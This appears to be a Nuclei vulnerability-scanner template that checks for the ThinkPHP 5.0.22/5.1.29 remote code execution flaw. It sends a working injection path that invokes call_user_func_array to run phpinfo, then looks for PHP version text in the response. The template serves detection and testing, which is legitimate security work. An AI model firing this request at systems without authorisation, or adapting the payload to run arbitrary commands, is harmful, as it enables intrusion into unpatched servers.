id: thinkphp-5022-rce
info:
  author: dr_set
  description: Thinkphp5 5.0.22/5.1.29 Remote Code Execution if the website doesn't
    have mandatory routing enabled (which is default).
  name: ThinkPHP 5.0.22 RCE
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  severity: critical
  tags: thinkphp,rce
requests:
- matchers:
  - condition: and
    type: word
    words:
    - PHP Extension
    - PHP Version
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
